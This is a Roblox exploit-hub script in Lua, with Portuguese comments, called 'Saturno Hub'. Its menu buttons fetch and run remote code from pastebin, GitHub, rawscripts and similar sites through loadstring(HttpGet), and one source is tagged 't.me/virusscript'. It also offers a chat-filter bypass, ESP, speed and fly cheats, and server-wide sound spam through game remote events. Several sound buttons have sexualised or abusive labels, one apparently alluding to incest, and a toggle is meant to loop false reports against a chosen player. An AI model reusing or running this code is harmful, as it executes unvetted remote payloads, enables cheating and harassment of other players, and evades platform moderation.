local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Kiwilegazin/Sartuno-hub/refs/heads/main/README.md')))()

local Window = OrionLib:MakeWindow({
    Name = "🪐SATURNO HUB🪐 UPTADE 21🎆", 
    HidePremium = false, 
    SaveConfig = true, 
    ConfigFolder = "SaturnoConfigs",
    IntroEnabled = true,
    IntroText = "🪐SATURNO HUB🪐",
    IntroIcon = "rbxassetid://108095891475184",
    Icon = "rbxassetid://108095891475184",
    CloseCallback = function() 
        print("Saturno")
    end
})

-- ID do som a ser reproduzido quando o código for executado
local soundId = "rbxassetid://108621585736031"

-- Função para tocar o som
local function playSound()
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Parent = game.Workspace -- Coloque no Workspace para garantir que seja ouvido
    sound:Play()
end

-- Tocar o som assim que o script for executado
playSound()


local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new("ImageButton")
Toggle.Name = "Toggle"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Toggle.BackgroundTransparency = 0.5
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 50, 0, 50)
Toggle.Image = "rbxassetid://108095891475184"
Toggle.Draggable = true

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0.1, 0)
Corner.Parent = Toggle

local isOn = false
local selectedPlayerName = nil

local function onButtonClicked()
    if gethui():FindFirstChild("Orion") then
        gethui().Orion.Enabled = not gethui().Orion.Enabled
    end
end

local function offButtonClicked()
    if gethui():FindFirstChild("Orion") then
        gethui().Orion.Enabled = not gethui().Orion.Enabled
    end
end

Toggle.MouseButton1Click:Connect(function()
    isOn = not isOn
    if isOn then
        Toggle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        onButtonClicked()
    else
        Toggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        offButtonClicked()
    end
end)



OrionLib:MakeNotification({
	Name = "🪐 SATURNO HUB🪐",
	Content = "bem vindos ao meu hub! divirta-se 🤑",
	Image = "rbxassetid://108095891475184",
	Time = 5
})

local Tab = Window:MakeTab({
	Name = "🤑scripts🤑",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "fly",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "rael hub!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet"https://raw.githubusercontent.com/Laelmano24/Rael-Hub/main/main.txt")()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "chat da buceta bypass",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AK-CHAT-BYPASSER-26254"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]


Tab:AddButton({
	Name = "P.B HUB!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://github.com/TemplariosScriptS2/PBHubUpdatedVersion6/raw/refs/heads/main/PBHubUpdatedVersion6.txt"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "BLOX fruits!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "setarium hub!",
	Callback = function()
      		print("button pressed")
loadstring(game:HttpGet("https://raw.githubusercontent.com/L0RD-SUD0/Sunterium-Hub/refs/heads/main/BETA%20RELEASE%200.1"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "reverse script!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://mscripts.vercel.app/scfiles/reverse-script.lua"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "astra x hub",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-AstroXhub-23818"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script animação r6 ",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "cleitão hub",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://pastefy.app/ta8BeBZc/raw"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "serpentao x",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/err0r129/SerpenteXbetaByDefense129/main/Serpente.Scripts"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "sounds v1🔊 APENAS BROOKHAVEN",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "id de uma menina safadinha🔥",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 6865649264,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id estourado",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] =7236490488,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id estranho🦠💤",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 933230732,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id de gemidinho com papai dela😈 ",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7818422471,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7818422471,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador 2",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] =146563959 ,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador 3",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 6486261822,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador 4🥶!",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assutador 5",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 930613220,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador 6",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 8411427507,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id assustador 7",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 8714865850,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id mais sus do mundo😈",
	Callback = function()
      		print("button pressed") local args = {
    [1] = workspace,
    [2] = 8161174075,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id sus👿",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 8259946669,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id engraçado 🤣🤣🤣",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7772388444,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id do bruh",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 6349641063,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id engraçado 2!",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7002518308,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "Scripts v2🌟",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "rochipas painel",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Rochips-Universal-21865"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "the darkones🕳️|brookhavenrp|",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "fe blackhole mais poderoso 🤬",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofyBlox/GoofyZ/refs/heads/main/Best/Vortex.lua", true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "infinite yield😶‍🌫️",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "nameless admin",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-V2-24856"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de brookhaven árabe",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Brookhave-lraq-20207"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "fake lag!",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FAKE-LAG-22520"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "redz hub para bloques frutas ",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de animação grátis SE ELOKO🤑",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script9")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]


local Tab = Window:MakeTab({
	Name = "sounds v2🔊💀",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "id phonk raro",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7826794186,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id estranho 2",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 4085923851,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id estranho sei la o que",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7473232658,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id estranho😆!",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7649993792,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id cala boca puta 👺",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 7053136007,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id anno🫠y",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 8325527347,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id dos top👾!",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] =6427245762 ,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id annoy estranho😶‍🌫️🦠!",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] =5153135899 ,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "id barulhento😖",
	Callback = function()
      		print("button pressed")local args = {
    [1] = workspace,
    [2] = 6486291225,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "scripts v3🥶",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "script de invisível",
	Callback = function()
      		print("button pressed")
--t.me/virusscript--
loadstring(game:HttpGet("https://pastebin.com/raw/TPs8NKu7"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = " script camera livre",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script aleatório",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/Davizinhofprest/Scriptrobloxzkm/refs/heads/main/Zkmteam/Iniciar/Hubzkmzeltau.txt"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of  button.
]]

Tab:AddButton({
	Name = "script vfly",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet("https://rawscripts.net/raw/Flat-Kurdish-Vfly-13538"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script que você muda suas skins salvas",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script18")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script de matemática para responder😃😃",
	Callback = function()
      		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Math%20Problem'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "script do jogo da velha (para destrair um pouco)😆",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]


local Tab = Window:MakeTab({
	Name = "misc🤑🤑🤑🤑🤑",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "pegar sofá",
	Callback = function()
      		print("button pressed")-- Equipa o item 'Couch'
  local args = {
[1] = "PickingTools",
[2] = "Couch"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  
  -- Equipa o item 'Couch' no inventário se ainda não estiver equipado
local backpack = game.Players.LocalPlayer.Backpack
if backpack and not couchEquipped then
local couch = backpack:FindFirstChild("Couch")
if couch then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
couchEquipped = true
else
print("O item 'Couch' não foi encontrado no seu inventário.")
end
end
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Section = Tab:AddSection({
    Name = "kick jogador"
})

local Players = game:GetService("Players")
local playerNames = {}

local function updatePlayerList()
    playerNames = {}
    for _, player in pairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
end

updatePlayerList()


local selectedPlayer = ""
local selectedReason = ""

Tab:AddDropdown({
    Name = "Selecionar o safado(a) que tava fazendo coisa errada",
    Default = "",
    Options = playerNames,
    Callback = function(value)
        selectedPlayer = value
        print("Selected player: " .. value)
    end
})

Tab:AddButton({
    Name = "atualizar a lista de jogadores 👿",
    Callback = function()
        updatePlayerList()
        OrionLib:MakeNotification({
            Name = "lista atualizada!!",
            Content = "The player list has been updated.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

Tab:AddDropdown({
    Name = "selecionar ",
    Default = "",
    Options = {"Web Namoro", "Exploits", "Pornografia","racismo","palavrões","tóxico","tóxica",},
    Callback = function(value)
        selectedReason = value
        print("Selected reason: " .. value)
    end
})

Tab:AddToggle({
    Name = "Loop Reportar",
    Default = false,
    Callback = function(value)
        while value do
            if selectedPlayer ~= "" and selectedReason ~= "" then
                print("Reporting " .. selectedPlayer .. " for " .. selectedReason)
                -- Aqui você pode adicionar o código para enviar a denúncia
            end
            wait(0.1)
        end
    end
})

local Section = Tab:AddSection({
    Name = "opções legais criados por mim🤑🤌"
})

Tab:AddButton({
	Name = "da um pulo gigante criado por frostzxx7",
	Callback = function()
      		print("button pressed")-- Fling Script para Roblox Mobile

-- Configuração inicial
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local userInputService = game:GetService("UserInputService")

-- Variável para ativar/desativar o fling
local flingEnabled = false

-- Função para ativar o fling
local function fling()
    if not flingEnabled then return end

    -- Definir a força do fling
    local flingForce = Vector3.new(0, 500, 0) -- Força para cima

    -- Aplicar força no personagem
    humanoidRootPart.Velocity = humanoidRootPart.Velocity + flingForce
end

-- Detectar toques na tela (para mobile)
userInputService.TouchTap:Connect(function()
    flingEnabled = not flingEnabled -- Alternar entre ligado e desligado
    if flingEnabled then
        print("Fling ativado!")
        fling()
    else
        print("Fling desativado!")
    end
end)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "esp jogadores|essa buçanga não funciona direito",
	Callback = function()
      		print("button pressed")-- Loop para adicionar ESP em todos os jogadores
local function addESP(player)
    if player ~= game.Players.LocalPlayer and player.Character then
        local character = player.Character
        local highlight = Instance.new("Highlight")
        
        -- Configurações do ESP
        highlight.Parent = character
        highlight.Adornee = character
        highlight.FillColor = Color3.new(1,0, 0) -- Vermelho
        highlight.FillTransparency = 0.5
        highlight.OutlineColor = Color3.new(1, 1, 1) -- Branco
        highlight.OutlineTransparency = 0
    end
end

-- Adiciona ESP a todos os jogadores atuais
for _, player in pairs(game.Players:GetPlayers()) do
    addESP(player)
end

-- Monitora novos jogadores que entram no jogo
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        wait(1) -- Pequeno delay para garantir que o personagem foi carregado
        addESP(player)
    end)
end)

-- Remove ESP quando o jogador sai
game.Players.PlayerRemoving:Connect(function(player)
    if player.Character and player.Character:FindFirstChildOfClass("Highlight") then
        player.Character:FindFirstChildOfClass("Highlight"):Destroy()
    end
end)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "shaders",
	Callback = function()
      		print("button pressed")-- Referência ao Lighting
local lighting = game:GetService("Lighting")

-- Função para configurar os efeitos de shader
local function applyShaders()
    -- Blur (Desfoque para simular profundidade)
    local blur = Instance.new("BlurEffect")
    blur.Size = 1 -- Tamanho do desfoque (ajuste conforme necessário)
    blur.Parent = lighting

    -- Correção de cores
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 240, 200) -- Tom quente
    colorCorrection.Contrast = 0.4 -- Aumenta o contraste
    colorCorrection.Saturation = 0.3 -- Melhora a saturação
    colorCorrection.Brightness = 0.06 -- Ajusta o brilho
    colorCorrection.Parent = lighting

    -- Bloom (Efeito de brilho)
    local bloom = Instance.new("BloomEffect")
    bloom.Intensity = 1.6 -- Intensidade do brilho
    bloom.Threshold = 2 -- Limite para o brilho aparecer
    bloom.Size = 24 -- Tamanho do efeito
    bloom.Parent = lighting

    -- Sun Rays (Raios solares)
    local sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.1 -- Intensidade dos raios
    sunRays.Spread = 1 -- Espalhamento dos raios
    sunRays.Parent = lighting
end

-- Aplica os shaders ao iniciar o jogo
applyShaders()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "ficar de noite!|as vezes não pode fucionar",
	Callback = function()
      		print("button pressed")-- Referência ao Lighting
local lighting = game:GetService("Lighting")

-- Define a hora fixa para a noite
local nightTime = 19 -- Hora para a noite (19:00)

-- para manter a noite sempre ativa
local function setNightForever()
    lighting.ClockTime = nightTime -- Define a hora para 19:00 (noite)
    lighting:GetPropertyChangedSignal("ClockTime"):Connect(function()
        lighting.ClockTime = nightTime -- Restaura a hora se ela mudar
    end)
end

-- Executa a função
setNightForever()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "deixar tudo verde| DÊR REJOIN PRA FICA NORMAL",
	Callback = function()
      		print("button pressed")-- Referência ao serviço Lighting
local lighting = game:GetService("Lighting")

-- Função para criar e configurar o céu verde
local function setGreenSky()
    -- Remove qualquer Sky existente
    if lighting:FindFirstChildOfClass("Sky") then
        lighting:FindFirstChildOfClass("Sky"):Destroy()
    end

    -- Cria uma nova instância de Sky
    local sky = Instance.new("Sky")
    sky.Parent = lighting

    -- Configurações personalizadas para o céu
    sky.SkyboxBk = "rbxassetid://0" -- Fundo verde (substitua por uma ID personalizada, se necessário)
    sky.SkyboxDn = "rbxassetid://0" -- Baixo verde
    sky.SkyboxFt = "rbxassetid://0" -- Frente verde
    sky.SkyboxLf = "rbxassetid://0" -- Esquerda verde
    sky.SkyboxRt = "rbxassetid://0" -- Direita verde
    sky.SkyboxUp = "rbxassetid://0" -- Cima verde

    -- Modifica a cor ambiental para combinar com o tema verde
    lighting.Ambient = Color3.fromRGB(50, 200, 50) -- Verde claro
    lighting.OutdoorAmbient = Color3.fromRGB(30, 150, 30) -- Verde escuro
    lighting.Brightness = 2 -- Ajusta o brilho para destacar a cor
end

-- Chama a função para aplicar o céu verde
setGreenSky()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "mudar velocidade!",
	Callback = function()
      		print("button pressed")-- LocalScript (coloque este script em StarterPlayer > StarterPlayerScripts)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Esperar pelo humanoide
local humanoid = character:WaitForChild("Humanoid")

-- Nova velocidade desejada
local newWalkSpeed = 90 -- Mude para a velocidade que você deseja (padrão é 16)

-- Aplicar a nova velocidade
humanoid.WalkSpeed = newWalkSpeed

-- Mensagem no console para confirmação
print("Velocidade alterada para: " .. newWalkSpeed)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "velocidade normal ",
	Callback = function()
      		print("button pressed")-- LocalScript (coloque este script em StarterPlayer > StarterPlayerScripts)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Esperar pelo humanoide
local humanoid = character:WaitForChild("Humanoid")

-- Nova velocidade desejada
local newWalkSpeed = 16 -- Mude para a velocidade que você deseja (padrão é 16)

-- Aplicar a nova velocidade
humanoid.WalkSpeed = newWalkSpeed

-- Mensagem no console para confirmação
print("Velocidade alterada para: " .. newWalkSpeed)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "gravidade🌕",
	Callback = function()
      		print("button pressed")-- Script para alterar a gravidade

local workspace = game:GetService("Workspace")

-- Configuração inicial da gravidade
local defaultGravity = 196.2 -- Gravidade padrão do Roblox
local customGravity = 50 -- Altere para o valor desejado (menor valor = gravidade reduzida)

-- Função para alterar a gravidade
local function setGravity(value)
    workspace.Gravity = value
    print("Gravidade ajustada para: " .. value)
end

-- Ajustar a gravidade personalizada
setGravity(customGravity)

-- Após 10 segundos, voltar à gravidade padrão
task.wait(10)
setGravity(defaultGravity)
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "pulo infinito|by happymod/ RESETE PRA FICA NORMAL!",
	Callback = function()
      		print("button pressed")-- Variável para controlar se o jogador pode saltar
local canJump = true

-- Detectar o jogador
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Serviço para lidar com entrada do jogador (toque ou teclado)
local UserInputService = game:GetService("UserInputService")

-- Função para realizar o salto
local function performJump()
    if canJump then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end

-- Detectar toques na tela (versão mobile)
UserInputService.TouchTap:Connect(function()
    performJump()
end)

